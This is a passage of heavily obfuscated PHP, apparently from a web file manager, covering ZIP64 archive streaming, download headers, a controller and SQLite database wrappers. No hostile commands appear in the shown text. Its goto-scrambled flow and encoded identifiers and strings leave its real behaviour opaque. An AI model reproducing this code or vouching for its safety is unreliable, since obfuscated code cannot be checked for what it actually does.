fø™×ĞêÖ»; fø™×ĞêÖ»: return strlen($dƒµ¢ĞöˆÆ) + $e¶Ù‡¼ ˆê + strlen($C˜äß ÊŠ°); goto CÚšÉÍê; E„ß¹ŠŠù‘: $c¥àƒß´èÃ = $this->dosTime(time()); $EÏºæŞêìõ = array(array($b¯ µÊéÖÊ[2014], static::FILE_HEADER_SIGNATURE), array($b¯ µÊéÖÊ[2015], static::ZIP_VERSION_64), array($b¯ µÊéÖÊ[2015], 8), array($b¯ µÊéÖÊ[2015], $BÔÃ¸Ñ¯âˆ), array($b¯ µÊéÖÊ[2014], $c¥àƒß´èÃ), array($b¯ µÊéÖÊ[2014], 0), array($b¯ µÊéÖÊ[2014], 4294967295), array($b¯ µÊéÖÊ[2014], 4294967295), array($b¯ µÊéÖÊ[2015], $e¶Ù‡¼ ˆê), array($b¯ µÊéÖÊ[2015], 32)); $DË›éóˆÂ’ = array(array($b¯ µÊéÖÊ[2015], 1), array($b¯ µÊéÖÊ[2015], 28), array($b¯ µÊéÖÊ[2016], 0), array($b¯ µÊéÖÊ[2016], 0), array($b¯ µÊéÖÊ[2016], 0), array($b¯ µÊéÖÊ[2014], 0)); goto Eã Çí÷º; CÚšÉÍê: } protected function addFileFooter($D…»ƒñ¾“­, $f¶ˆà¿³èå, $F…÷İÄÅ´æ, $F÷“íŠ‡ğ, $a¹¸ƒ÷Ñ, $e•¤Šîš‡…) { $D•Ğ¹¥ã¦… =& $_SERVER[‚Ğ°–—î]; $Fã¹ƒˆßŞ¬ = array(array($D•Ğ¹¥ã¦…[2014], static::DATA_DESCRIPTOR_SIGNATURE), array($D•Ğ¹¥ã¦…[2014], $F…÷İÄÅ´æ), array($D•Ğ¹¥ã¦…[2016], $F÷“íŠ‡ğ), array($D•Ğ¹¥ã¦…[2016], $a¹¸ƒ÷Ñ)); $fäÌ˜é‡©Š = $this->packFields($Fã¹ƒˆßŞ¬); $this->send($fäÌ˜é‡©Š); $CâÀøé‰° = $e•¤Šîš‡… + $F÷“íŠ‡ğ + $e…¼ÁÅ…’š; $this->addToCdr($D…»ƒñ¾“­, $f¶ˆà¿³èå, $F…÷İÄÅ´æ, $F÷“íŠ‡ğ, $a¹¸ƒ÷Ñ, $CâÀøé‰°); } private function addToCdr($CàŠÈî§Ø§, $CÔƒÕƒ˜Î, $fğ…¯š±¶Æ, $a†ˆ¹ß», $F‹ÍÍİ«Î, $B‚ÂÊ©Í‚ë) { $this->files[] = array($CàŠÈî§Ø§, $CÔƒÕƒ˜Î, $fğ…¯š±¶Æ, $a†ˆ¹ß», $F‹ÍÍİ«Î, $this->ofs); $this->ofs += $B‚ÂÊ©Í‚ë; } protected function addCdrFile($b¥à¸ó“ÈÉ) { goto fÎŠ¾ÆÍˆ·; fï˜Šç®¢‹: $Eäö Ë›ƒë = $this->dosTime(time()); $Bã±ÜßÔ÷„ = array(array($FÎÁˆÊÅ’­[2014], static::CDR_FILE_SIGNATURE), array($FÎÁˆÊÅ’­[2015], static::ZIP_VERSION_64), array($FÎÁˆÊÅ’­[2015], static::ZIP_VERSION_64), array($FÎÁˆÊÅ’­[2015], 8), array($FÎÁˆÊÅ’­[2015], $FàÚÏ÷­•å), array($FÎÁˆÊÅ’­[2014], $Eäö Ë›ƒë), array($FÎÁˆÊÅ’­[2014], $DÕÛ•è›¹ö), array($FÎÁˆÊÅ’­[2014], 4294967295), array($FÎÁˆÊÅ’­[2014], 4294967295), array($FÎÁˆÊÅ’­[2015], strlen($b¯•¡Ï‰Û)), array($FÎÁˆÊÅ’­[2015], 32), array($FÎÁˆÊÅ’­[2015], strlen($Câ£Ö¿æÍŠ)), array($FÎÁˆÊÅ’­[2015], 0), array($FÎÁˆÊÅ’­[2015], 0), array($FÎÁˆÊÅ’­[2014], 32), array($FÎÁˆÊÅ’­[2014], 4294967295)); $f¾é¡¦›øâ = array(array($FÎÁˆÊÅ’­[2015], 1), array($FÎÁˆÊÅ’­[2015], 28), array($FÎÁˆÊÅ’­[2016], $cŸÕƒ å¦), array($FÎÁˆÊÅ’­[2016], $a¤›¿â‘¨Ô), array($FÎÁˆÊÅ’­[2016], $A£××Ø²»Œ), array($FÎÁˆÊÅ’­[2014], 0)); goto c‘À¶Áİ™Á; fÎŠ¾ÆÍˆ·: $FÎÁˆÊÅ’­ =& $_SERVER[‚Ğ°–—î]; list($b¯•¡Ï‰Û, $FàÚÏ÷­•å, $DÕÛ•è›¹ö, $a¤›¿â‘¨Ô, $cŸÕƒ å¦, $A£××Ø²»Œ) = $b¥à¸ó“ÈÉ; $Câ£Ö¿æÍŠ = $FÎÁˆÊÅ’­[33]; goto fï˜Šç®¢‹; c‘À¶Áİ™Á: $cà÷™ØÜİ = $this->packFields($Bã±ÜßÔ÷„); $aŠñ‚ìÙ§ = $this->packFields($f¾é¡¦›øâ); $eÕ ¬°ñÜ = $cà÷™ØÜİ . $b¯•¡Ï‰Û . $Câ£Ö¿æÍŠ . $aŠñ‚ìÙ§; goto b™ø¬Åã·; b™ø¬Åã·: $this->send($eÕ ¬°ñÜ); $this->cdr_ofs += strlen($eÕ ¬°ñÜ); goto f„‰×ÔŒ“ò; f„‰×ÔŒ“ò: } protected function addCdr64Eof() { goto CÕø¿³æÚ; a—ª¹‹Ã†ß: $DÜàéêåÇ½ = $this->ofs; $a¹ƒÏº¶ÀÇ = array(array($d¸²ã¡¢Ú[2014], static::ZIP64_CDR_EOF_SIGNATURE), array($d¸²ã¡¢Ú[2016], 44), array($d¸²ã¡¢Ú[2015], static::ZIP_VERSION_64), array($d¸²ã¡¢Ú[2015], static::ZIP_VERSION_64), array($d¸²ã¡¢Ú[2014], 0), array($d¸²ã¡¢Ú[2014], 0), array($d¸²ã¡¢Ú[2016], $Dš×Åà¯Š±), array($d¸²ã¡¢Ú[2016], $Dš×Åà¯Š±), array($d¸²ã¡¢Ú[2016], $B†Úâà‡“†), array($d¸²ã¡¢Ú[2016], $DÜàéêåÇ½)); $eÙ°½ÈÊÛğ = $this->packFields($a¹ƒÏº¶ÀÇ); goto BÅ‡­£ã£ë; BÅ‡­£ã£ë: $this->send($eÙ°½ÈÊÛğ); goto C‚Ïğ‹ŞÃĞ; CÕø¿³æÚ: $d¸²ã¡¢Ú =& $_SERVER[‚Ğ°–—î]; $Dš×Åà¯Š± = count($this->files); $B†Úâà‡“† = $this->cdr_ofs; goto a—ª¹‹Ã†ß; C‚Ïğ‹ŞÃĞ: } protected function addCdr64Locator() { goto aİĞÉÇÒ¦ß; F»õ´ÇŠ‚: $this->send($c°õàä¼‘õ); goto FÄˆƒ®î¿; B‰ë‹Š™åä: $bæ‚­À¸†Ù = $this->ofs; $f¤Ù£Ÿ‡Ø = array(array($f¶ÃßªÈğ¿[2014], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($f¶ÃßªÈğ¿[2014], 0), array($f¶ÃßªÈğ¿[2016], $bæ‚­À¸†Ù + $cŒàíøÆÚ°), array($f¶ÃßªÈğ¿[2014], 1)); $c°õàä¼‘õ = $this->packFields($f¤Ù£Ÿ‡Ø); goto F»õ´ÇŠ‚; aİĞÉÇÒ¦ß: $f¶ÃßªÈğ¿ =& $_SERVER[‚Ğ°–—î]; $fñˆäÈ’áò = count($this->files); $cŒàíøÆÚ° = $this->cdr_ofs; goto B‰ë‹Š™åä; FÄˆƒ®î¿: } protected function addCdrEof() { goto FÌ¼Šˆ©÷”; C¾ÍÉ„ï¯: $B¢¯µ³ = $this->packFields($EéÌ‰ê…İÌ) . $cÌÈÙ„¤õ£; $this->send($B¢¯µ³); goto dÖ¡´ñîô; FÌ¼Šˆ©÷”: $c“¯‰¿Ç©‰ =& $_SERVER[‚Ğ°–—î]; $eĞ­˜Ìóù± = count($this->files); $BÇÕİò¶‹ = $this->cdr_ofs; goto a¡²´Õƒª; a¡²´Õƒª: $dğêÜá¼ƒª = $this->ofs; $cÌÈÙ„¤õ£ = $c“¯‰¿Ç©‰[33]; $EéÌ‰ê…İÌ = array(array($c“¯‰¿Ç©‰[2014], static::CDR_EOF_SIGNATURE), array($c“¯‰¿Ç©‰[2015], 0), array($c“¯‰¿Ç©‰[2015], 0), array($c“¯‰¿Ç©‰[2015], $eĞ­˜Ìóù±), array($c“¯‰¿Ç©‰[2015], $eĞ­˜Ìóù±), array($c“¯‰¿Ç©‰[2014], 4294967295), array($c“¯‰¿Ç©‰[2014], 4294967295), array($c“¯‰¿Ç©‰[2015], strlen($cÌÈÙ„¤õ£))); goto C¾ÍÉ„ï¯; dÖ¡´ñîô: } protected function addCdr() { foreach ($this->files as $DâƒòŸÏ»¢) { $this->addCdrFile($DâƒòŸÏ»¢); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $FËÉ‹„Õ =& $_SERVER[‚Ğ°–—î]; $CÌ‘´‚›‹ = $FËÉ‹„Õ[202]; if ($this->outputName) { $E‘‘ŞÛ¢Ãù = trim(str_replace(array($FËÉ‹„Õ[113], $FËÉ‹„Õ[55], $FËÉ‹„Õ[93], $FËÉ‹„Õ[67], $FËÉ‹„Õ[217], $FËÉ‹„Õ[993]), $FËÉ‹„Õ[33], $this->outputName)); $dÊÙİŠ»ÖÒ = rawurlencode($E‘‘ŞÛ¢Ãù); $CÌ‘´‚›‹ .= "\x3b\40\x66\151\154\x65\x6e\141\155\145\x2a\x3d\x75\164\x66\x2d\x38\47\47{$dÊÙİŠ»ÖÒ}"; } $Aºà‰Ç×µ¥ = array($FËÉ‹„Õ[199] => $FËÉ‹„Õ[2017], $FËÉ‹„Õ[2018] => $CÌ‘´‚›‹, $FËÉ‹„Õ[2019] => $FËÉ‹„Õ[2020], $FËÉ‹„Õ[2021] => $FËÉ‹„Õ[2022], $FËÉ‹„Õ[2023] => $FËÉ‹„Õ[2024]); foreach ($Aºà‰Ç×µ¥ as $AŸÏÙ˜¸æ => $Aõå°’ÎÁ) { header($AŸÏÙ˜¸æ . $FËÉ‹„Õ[881] . $Aõå°’ÎÁ); } } protected function send($FÁğšÉ­Ô ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $FÁğšÉ­Ô ); } protected final function dosTime($C¥Ú†ÅÇÜ³) { $cÊ®¬Œ¸ £ =& $_SERVER[‚Ğ°–—î]; $E¿Ş¤ñ‡Æà = getdate($C¥Ú†ÅÇÜ³); if ($E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[1727]] < 1980) { $E¿Ş¤ñ‡Æà = array($cÊ®¬Œ¸ £[1727] => 1980, $cÊ®¬Œ¸ £[2025] => 1, $cÊ®¬Œ¸ £[2026] => 1, $cÊ®¬Œ¸ £[2027] => 0, $cÊ®¬Œ¸ £[2028] => 0, $cÊ®¬Œ¸ £[2029] => 0); } $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[1727]] -= 1980; return $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[1727]] << 25 | $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[2025]] << 21 | $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[2026]] << 16 | $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[2027]] << 11 | $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[2028]] << 5 | $E¿Ş¤ñ‡Æà[$cÊ®¬Œ¸ £[2029]] >> 1; } protected function packFields($b’ŠÇçè±ñ) { $B‡î­¿å•Ì =& $_SERVER[‚Ğ°–—î]; $D›¡‚‰ˆÒ = $B‡î­¿å•Ì[33]; $C³Š„ïÍ¯Ï = array(); foreach ($b’ŠÇçè±ñ as $BğŞâá‰Ğ›) { $D›¡‚‰ˆÒ .= $BğŞâá‰Ğ›[0]; $C³Š„ïÍ¯Ï[] = $BğŞâá‰Ğ›[1]; } array_unshift($C³Š„ïÍ¯Ï, $D›¡‚‰ˆÒ); return call_user_func_array($B‡î­¿å•Ì[2030], $C³Š„ïÍ¯Ï); } protected function filterFilename($f¥„ø—ˆ…²) { $Bæ³ª°Ë³· =& $_SERVER[‚Ğ°–—î]; return str_replace(array($Bæ³ª°Ë³·[93], $Bæ³ª°Ë³·[4], $Bæ³ª°Ë³·[176], $Bæ³ª°Ë³·[69], $Bæ³ª°Ë³·[113], $Bæ³ª°Ë³·[926], $Bæ³ª°Ë³·[929], $Bæ³ª°Ë³·[271]), $Bæ³ª°Ë³·[70], $f¥„ø—ˆ…²); } } goto CêÊºÀ¥ã; EêÚŠŠ—: define($_SERVER[‚Ğ°–—î][227], 2); define($_SERVER[‚Ğ°–—î][228], 3); define($_SERVER[‚Ğ°–—î][229], 1); goto eøâ‚Èòš¸; EªÑ‚Ù„È: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto fšíÏƒÑÇË; F¡³àÃ«Ùˆ: $this->tpl = TEMPLATE . MOD . $B‰ù˜±•ÑŠ[8]; $this->_classObjectID = mt_rand(0, 10000); goto AÜÊ£Úêä; cŞâä‹Æï: $this->in =& $in; $this->values[$B‰ù˜±•ÑŠ[6]] =& $config; $this->values[$B‰ù˜±•ÑŠ[7]] =& $in; goto F¡³àÃ«Ùˆ; fšíÏƒÑÇË: $B‰ù˜±•ÑŠ =& $_SERVER[‚Ğ°–—î]; global $in, $config; $this->config =& $config; goto cŞâä‹Æï; AÜÊ£Úêä: } public function loadClass($bß‡¦£¶Üä) { if (1 === func_num_args()) { $this->{$bß‡¦£¶Üä} = new $bß‡¦£¶Üä(); } else { $b»®©•…Ùã = new ReflectionClass($bß‡¦£¶Üä); $fçÄº˜¤¾‘ = func_get_args(); array_shift($fçÄº˜¤¾‘); $this->{$bß‡¦£¶Üä} = $b»®©•…Ùã->newInstanceArgs($fçÄº˜¤¾‘); } return $this->{$bß‡¦£¶Üä}; } protected function assign($cš¯ƒ‰‡Š‡, $e”Ûˆ¯¯çä) { $this->values[$cš¯ƒ‰‡Š‡] = $e”Ûˆ¯¯çä; } protected function display($Aóï—¦³•Ù) { ob_end_clean(); extract($this->values); require $this->tpl . $Aóï—¦³•Ù; } } class DbSqliteBase extends Db { public function __construct($BÁğÇ¼İª« = '') { $fğĞñ…‰ñÓ =& $_SERVER[‚Ğ°–—î]; if (!extension_loaded($fğĞñ…‰ñÓ[9])) { think_exception(think_lang($fğĞñ…‰ñÓ[10]) . $fğĞñ…‰ñÓ[11]); } if (!empty($BÁğÇ¼İª«)) { if (!isset($BÁğÇ¼İª«[$fğĞñ…‰ñÓ[12]])) { $BÁğÇ¼İª«[$fğĞñ…‰ñÓ[12]] = 438; } $this->config = $BÁğÇ¼İª«; if (empty($this->config[$fğĞñ…‰ñÓ[13]])) { $this->config[$fğĞñ…‰ñÓ[13]] = array(); } } } public function connect($eïœ‚Ô‰À¶ = '', $EåŸ§‚‘É = 0) { $AÖğÛóÌ±Á =& $_SERVER[‚Ğ°–—î]; if (!isset($this->linkID[$EåŸ§‚‘É])) { goto bôÒ›¬œˆ®; bôÒ›¬œˆ®: if (empty($eïœ‚Ô‰À¶)) { $eïœ‚Ô‰À¶ = $this->config; } $DÁšƒ³Ëç = !empty($eïœ‚Ô‰À¶[$AÖğÛóÌ±Á[13]][$AÖğÛóÌ±Á[14]]) ? $eïœ‚Ô‰À¶[$AÖğÛóÌ±Á[13]][$AÖğÛóÌ±Á[14]] : $this->pconnect; $b•×ê‡£Š­ = $DÁšƒ³Ëç ? $AÖğÛóÌ±Á[15] : $AÖğÛóÌ±Á[16]; goto f©‰ì±›¡¿; b¢†¤Çˆ: @sqlite_busy_timeout($this->linkID[$EåŸ§‚‘É], 30000); if (1 != think_config($AÖğÛóÌ±Á[18])) { unset($this->config); } goto CÚìÚ—ê¬; f©‰ì±›¡¿: $this->linkID[$EåŸ§‚‘É] = $b•×ê‡£Š­($eïœ‚Ô‰À¶[$AÖğÛóÌ±Á[17]], $eïœ‚Ô‰À¶[$AÖğÛóÌ±Á[12]]); if (!$this->linkID[$EåŸ§‚‘É]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto b¢†¤Çˆ; CÚìÚ—ê¬: } return $this->linkID[$EåŸ§‚‘É]; } public function free() { $this->queryID = null; } public function query($bø–¸Ğ£°´) { goto B‘©¾‘•‘Ú; CÊ™Õ±Ö¤í: $this->queryStr = $bø–¸Ğ£°´; if ($this->queryID) { $this->free(); } think_action_status($Eä¹²¨Í„[19], 1); goto aÕã©–•æÆ; B‘©¾‘•‘Ú: $Eä¹²¨Í„ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÊ™Õ±Ö¤í; DºÈ©‹ÀÑÎ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $AÅ’îŞ»÷© = $this->getAll(); return $AÅ’îŞ»÷©; } goto BğÁİí—Šµ; aÕã©–•æÆ: think_status($Eä¹²¨Í„[20]); $this->queryID = sqlite_query($this->_linkID, $bø–¸Ğ£°´); $this->debug(); goto DºÈ©‹ÀÑÎ; BğÁİí—Šµ: } public function execute($d·ñÅ˜ƒ) { goto A¶èß¿ê–; FÙãöŒôË¾: if (!1 === $F—Ï™êÖ°) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b–šßÁ¼Å–; A¶èß¿ê–: $FÓÚ´¾†İÕ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F—Ô·˜©É; fÅ¼Œöõ£‘: think_status($FÓÚ´¾†İÕ[20]); $F—Ï™êÖ° = sqlite_exec($this->_linkID, $d·ñÅ˜ƒ); $this->debug(); goto FÙãöŒôË¾; F—Ô·˜©É: $this->queryStr = $d·ñÅ˜ƒ; if ($this->queryID) { $this->free(); } think_action_status($FÓÚ´¾†İÕ[21], 1); goto fÅ¼Œöõ£‘; b–šßÁ¼Å–: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‚Ğ°–—î][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A´¡ Â‚í = sqlite_query($this->_linkID, $_SERVER[‚Ğ°–—î][23]); if (!$A´¡ Â‚í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c¼á·²í• = sqlite_query($this->_linkID, $_SERVER[‚Ğ°–—î][24]); if (!$c¼á·²í•) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BŞ‰À¦Š¹í = array(); if ($this->numRows > 0) { for ($BËÄø™Îå = 0; $BËÄø™Îå < $this->numRows; $BËÄø™Îå++) { $BŞ‰À¦Š¹í[$BËÄø™Îå] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $BŞ‰À¦Š¹í; } public function getFields($dÆ»Ç¢ÈÉ) { $b”’ÇÓ± =& $_SERVER[‚Ğ°–—î]; $eÃİºØØÓ§ = $this->query($b”’ÇÓ±[25] . $dÆ»Ç¢ÈÉ . $b”’ÇÓ±[26]); $Fø¶‚ÈôŠ— = array(); if ($eÃİºØØÓ§) { foreach ($eÃİºØØÓ§ as $føçƒœï¸ => $c­®¢Ù®„‘) { $Fø¶‚ÈôŠ—[$c­®¢Ù®„‘[$b”’ÇÓ±[27]]] = array($b”’ÇÓ±[28] => $c­®¢Ù®„‘[$b”’ÇÓ±[27]], $b”’ÇÓ±[29] => $c­®¢Ù®„‘[$b”’ÇÓ±[30]], $b”’ÇÓ±[31] => (bool) ($c­®¢Ù®„‘[$b”’ÇÓ±[32]] === $b”’ÇÓ±[33]), $b”’ÇÓ±[34] => $c­®¢Ù®„‘[$b”’ÇÓ±[35]], $b”’ÇÓ±[36] => strtolower($c­®¢Ù®„‘[$b”’ÇÓ±[37]]) == $b”’ÇÓ±[38], $b”’ÇÓ±[39] => strtolower($c­®¢Ù®„‘[$b”’ÇÓ±[40]]) == $b”’ÇÓ±[41]); } } return $Fø¶‚ÈôŠ—; } public function getTables($dÑ„×£âäó = '') { $B¸Ó²Å«Ì¸ =& $_SERVER[‚Ğ°–—î]; $bÇŞ¿¥‘ = $this->query($B¸Ó²Å«Ì¸[42] . $B¸Ó²Å«Ì¸[43] . $B¸Ó²Å«Ì¸[44]); $C»¹åÍÊÜâ = array(); foreach ($bÇŞ¿¥‘ as $e´ßÖé‹‚ => $dáĞ«¶ãÃÛ) { $C»¹åÍÊÜâ[$e´ßÖé‹‚] = current($dáĞ«¶ãÃÛ); } return $C»¹åÍÊÜâ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c»›µ‰ëµ =& $_SERVER[‚Ğ°–—î]; $fšÇÚ—‹¾ = sqlite_last_error($this->_linkID); $this->error = $fšÇÚ—‹¾ . $c»›µ‰ëµ[4] . sqlite_error_string($fšÇÚ—‹¾); if ($c»›µ‰ëµ[33] != $this->queryStr) { $this->error .= LNG($c»›µ‰ëµ[45]) . $this->queryStr; } think_trace($this->error, $c»›µ‰ëµ[33], $c»›µ‰ëµ[46]); return $this->error; } public function escapeString($D¦ğÍ ù Û) { return sqlite_escape_string($D¦ğÍ ù Û); } public function parseLimit($b³Äí²‡‡Ò) { $Aêô„¼ñ…É =& $_SERVER[‚Ğ°–—î]; $cŠ¯ñºîòŠ = $Aêô„¼ñ…É[33]; if (!empty($b³Äí²‡‡Ò)) { $b³Äí²‡‡Ò = explode($Aêô„¼ñ…É[47], $b³Äí²‡‡Ò); if (count($b³Äí²‡‡Ò) > 1) { $cŠ¯ñºîòŠ .= $Aêô„¼ñ…É[48] . $b³Äí²‡‡Ò[1] . $Aêô„¼ñ…É[49] . $b³Äí²‡‡Ò[0] . $Aêô„¼ñ…É[50]; } else { $cŠ¯ñºîòŠ .= $Aêô„¼ñ…É[48] . $b³Äí²‡‡Ò[0] . $Aêô„¼ñ…É[50]; } } return $cŠ¯ñºîòŠ; } } class DbSqlite3Base extends Db { public function __construct($A™Ş’©é‘§ = '') { $FËîÉ§’ÊÒ =& $_SERVER[‚Ğ°–—î]; if (!class_exists($FËîÉ§’ÊÒ[51])) { think_exception(think_lang($FËîÉ§’ÊÒ[10]) . $FËîÉ§’ÊÒ[52]); } if (!empty($A™Ş’©é‘§)) { if (!isset($A™Ş’©é‘§[$FËîÉ§’ÊÒ[12]])) { $A™Ş’©é‘§[$FËîÉ§’ÊÒ[12]] = 438; } $this->config = $A™Ş’©é‘§; if (empty($this->config[$FËîÉ§’ÊÒ[13]])) { $this->config[$FËîÉ§’ÊÒ[13]] = array(); } } } public function connect($càÙ«£´° = '', $eÑŸ–ßÇ†Ø = 0) { $EãÉö„ˆÍ =& $_SERVER[‚Ğ°–—î]; if (!isset($this->linkID[$eÑŸ–ßÇ†Ø])) { if (empty($càÙ«£´°)) { $càÙ«£´° = $this->config; } $this->linkID[$eÑŸ–ßÇ†Ø] = new SQLite3($càÙ«£´°[$EãÉö„ˆÍ[17]]); if (!$this->linkID[$eÑŸ–ßÇ†Ø]) { think_exception($this->linkID[$eÑŸ–ßÇ†Ø]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$eÑŸ–ßÇ†Ø]->busyTimeout(30000); if (1 != think_config($EãÉö„ˆÍ[18])) { unset($this->config); } } return $this->linkID[$eÑŸ–ßÇ†Ø]; } public function free() { $this->queryID = null; } public function query($fÎ¼¶Ÿƒã) { goto E“•®äøĞ„; Cñäå£é•à: if (!1 === $this->queryID) { $this->error(); return !1; } else { $E×¡µÛ‡à· = $this->getAll(); $this->numRows = count($E×¡µÛ‡à·); return $E×¡µÛ‡à·; } goto a½ìÄ¹Ô‡˜; CÇ§æ”Ò: $this->queryStr = $fÎ¼¶Ÿƒã; if ($this->queryID) { $this->free(); } think_action_status($CŒŒÉÑ³ÉÌ[19], 1); goto A×”ÌÃŞ…; E“•®äøĞ„: $CŒŒÉÑ³ÉÌ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÇ§æ”Ò; A×”ÌÃŞ…: think_status($CŒŒÉÑ³ÉÌ[20]); $this->queryID = $this->_linkID->query($fÎ¼¶Ÿƒã); $this->debug(); goto Cñäå£é•à; a½ìÄ¹Ô‡˜: } public function execute($DêÖ¡åöõ‘) { goto d§±¬ğ±òë; C°Š•›Š‘: if (!1 === $f‡Š†à¬‘™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto FÚá·ßÂ˜; B…áÉ°¿öé: think_status($D×ÚëÀ÷¥[20]); $f‡Š†à¬‘™ = $this->_linkID->exec($DêÖ¡åöõ‘); $this->debug(); goto C°Š•›Š‘; f™í¸ÌÙÚÈ: $this->queryStr = $DêÖ¡åöõ‘; if ($this->queryID) { $this->free(); } think_action_status($D×ÚëÀ÷¥[21], 1); goto B…áÉ°¿öé; d§±¬ğ±òë: $D×ÚëÀ÷¥ =& $_SERVER[‚Ğ°–—î]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f™í¸ÌÙÚÈ; FÚá·ßÂ˜: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‚Ğ°–—î][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eêì¨î‚Û = $this->_linkID->query($_SERVER[‚Ğ°–—î][23]); if (!$eêì¨î‚Û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $B‰Ñ…‘ºÕš = $this->_linkID->query($_SERVER[‚Ğ°–—î][24]); if (!$B‰Ñ…‘ºÕš) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B›ì‰ß‡÷ò = array(); while ($e–¬ÁÅ§Ö = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B›ì‰ß‡÷ò[] = $e–¬ÁÅ§Ö; } $this->queryID->reset(); return $B›ì‰ß‡÷ò; } public function getFields($aß…¨†Šƒ) { $EâÙÃ§Ğ¯¯ =& $_SERVER[‚Ğ°–—î]; $cá½¤­¶º— = $this->query($EâÙÃ§Ğ¯¯[25] . $aß…¨†Šƒ . $EâÙÃ§Ğ¯¯[26]); $C§„ŒëğÕó = array(); if ($cá½¤­¶º—) { foreach ($cá½¤­¶º— as $fãîŞê«¨ => $F¸ËËèÅ’Œ) { $C§„ŒëğÕó[$F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[28]]] = array($EâÙÃ§Ğ¯¯[28] => $F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[28]], $EâÙÃ§Ğ¯¯[29] => $F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[29]], $EâÙÃ§Ğ¯¯[31] => (bool) ($F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[31]] === $EâÙÃ§Ğ¯¯[33]), $EâÙÃ§Ğ¯¯[34] => $F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[53]], $EâÙÃ§Ğ¯¯[36] => (bool) $F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[54]], $EâÙÃ§Ğ¯¯[39] => (bool) $F¸ËËèÅ’Œ[$EâÙÃ§Ğ¯¯[54]]); } } return $C§„ŒëğÕó; } public function getTables($dæ‹«¶Á…´ = '') { $c’ğÚŒåôÖ =& $_SERVER[‚Ğ°–—î]; $dÊĞÈƒİÑ = $this->query($c’ğÚŒåôÖ[42] . $c’ğÚŒåôÖ[43] . $c’ğÚŒåôÖ[44]); $D°ø†ÒÌá = array(); foreach ($dÊĞÈƒİÑ as $d¶Õ ÚˆËÛ => $eÂø¬ä¯µà) { $D°ø†ÒÌá[$d¶Õ ÚˆËÛ] = current($eÂø¬ä¯µà); } return $D°ø†ÒÌá; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bïÎÎÑÙÅ =& $_SERVER[‚Ğ°–—î]; $this->error = $this->_linkID->lastErrorMsg(); if ($bïÎÎÑÙÅ[33] != $this->queryStr) { $this->error .= LNG($bïÎÎÑÙÅ[45]) . $this->queryStr; } think_trace($this->error, $bïÎÎÑÙÅ[33], $bïÎÎÑÙÅ[46]); return $this->error; } public function escapeString($FÂÁ¤‚‹Í“) { $aù…™¤İí‘ =& $_SERVER[‚Ğ°–—î]; if ($this->_linkID) { return $this->_linkID->escapeString($FÂÁ¤‚‹Í“); } return str_ireplace($aù…™¤İí‘[55], $aù…™¤İí‘[56], $FÂÁ¤‚‹Í“); } public function parseLimit($C¢¦¶½»ÑÕ) { $f·²©éÆà =& $_SERVER[‚Ğ°–—î]; $AÁô±‚¶š = $f·²©éÆà[33]; if (!empty($C¢¦¶½»ÑÕ)) { $C¢¦¶½»ÑÕ = explode($f·²©éÆà[47], $C¢¦¶½»ÑÕ); if (count($C¢¦¶½»ÑÕ) > 1) { $AÁô±‚¶š .= $f·²©éÆà[48] . $C¢¦¶½»ÑÕ[1] . $f·²©éÆà[49] . $C¢¦¶½»ÑÕ[0] . $f·²©éÆà[50]; } else { $AÁô±‚¶š .= $f·²©éÆà[48] . $C¢¦¶½»ÑÕ[0] . $f·²©éÆà[50]; } } return $AÁô±‚¶š; } } goto BÚ—øõ´ÀÚ; d›ŸÑ…âÒÌ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = 